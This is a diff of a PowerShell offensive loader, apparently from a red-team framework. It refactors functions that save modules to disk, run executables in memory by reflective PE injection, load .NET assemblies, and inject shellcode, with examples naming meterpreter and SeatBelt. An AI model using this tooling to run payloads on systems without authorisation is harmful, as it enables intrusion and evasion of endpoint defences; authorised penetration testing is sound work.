@@ -229,8 +229,8 @@ Load the exe module with the name 'meterpreter.exe' in memory and run it
     )
 
     if ($OnDisk) {
-        foreach ($n in $Module) {
-            $Filename = Save-HubModule $n -Directory $env:TMP
+        foreach ($m in $Module) {
+            $Filename = Save-HubModule $m -Directory $env:TMP
             if ($ExeArgs) {
                 Start-Process -FilePath "$Filename" -ArgumentList "$ExeArgs"
             } else {
@@ -242,13 +242,8 @@ Load the exe module with the name 'meterpreter.exe' in memory and run it
             Load-HubModule Invoke-ReflectivePEInjection
         }
         if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue) {
-            foreach ($n in $Module) {
-                if ($n.gettype() -eq [Int32]) {
-                    $code = $Modules[$n].Code
-                } else {
-                    $code = $n.Code
-                }
-                Invoke-ReflectivePEInjection -PEBytes $code -ForceASLR -ExeArgs $ExeArgs
+            foreach ($m in $Module) {
+                Invoke-ReflectivePEInjection -PEBytes $m.Code -ForceASLR -ExeArgs $ExeArgs
             }
         } else {
             Write-Error "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
@@ -264,11 +259,11 @@ Saves a loaded module to disk. WARNING: This will most likely trigger endpoint p
 
 .EXAMPLE
 
-Save-HubModule 41 -Directory tmp/
+Get-HubModule SeatBelt | Save-HubModule -Directory tmp/
 
 Description
 -----------
-Save module 41 to directory tmp/
+Save that module whose name matches "SeatBelt" to directory tmp/
 
 .EXAMPLE
 
@@ -286,12 +281,7 @@ Load the exe module with the name 'meterpreter.exe' in memory and save it to dis
         [parameter(Mandatory=$false,Position=1)] $Directory = ""
     )
 
-    foreach ($n in $Module) {
-        if ($n.gettype() -eq [Int32]) {
-            $m = $Modules[$n]
-        } else {
-            $m = $n
-        }
+    foreach ($m in $Module) {
         $code = $m.Code
         if ($Directory) {
             $Filename = "$Directory/$($m.BaseName)"
@@ -313,12 +303,12 @@ This might trigger the anti-virus.
 
 .EXAMPLE
 
-Load-HubModule SeatBelt
-Run-DotNETExe 47 "system"
+Load-HubModule SeatBelt | Run-DotNETExe "system"
 
 Description
 -----------
-Load and execute the .NET binary 47 in memory with the parameter "system"
+Load and execute the .NET binary whose name matches "SeatBelt" in memory with
+the parameter "system"
 
 .EXAMPLE
 
@@ -337,12 +327,7 @@ Load the .NET module with the name 'meterpreter.exe' in memory and run it
         [parameter(Mandatory=$false)] [String[]] $Arguments
     )
 
-    foreach ($n in $Module) {
-        if ($n.gettype() -eq [Int32]) {
-            $m = $Modules[$n]
-        } else {
-            $m = $n
-        }
+    foreach ($m in $Module) {
         $code = $m.Code
         $a = [Reflection.Assembly]::Load([byte[]]$code)
         $al = New-Object -TypeName System.Collections.ArrayList
@@ -360,11 +345,11 @@ Executes a loaded shellcode module in memory using Invoke-Shellcode, which must 
 
 .EXAMPLE
 
-Run-Shellcode 47
+Run-Shellcode $someModule
 
 Description
 -----------
-Execute the shellcode module 47 in memory
+Execute a HubModule of type "shellcode" in memory
 
 .EXAMPLE
 
@@ -387,12 +372,7 @@ Load the shellcode module with the name 'meterpreter.bin' in memory and run it
     }
     if (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)
     {
-        foreach ($n in $Module) {
-            if ($n.gettype() -eq [Int32]) {
-                $m = $Modules[$n]
-            } else {
-                $m = $n
-            }
+        foreach ($m in $Module) {
             $code = $m.Code
             if ($ProcessID) {
                 Invoke-Shellcode -Shellcode $code -ProcessID $ProcessID
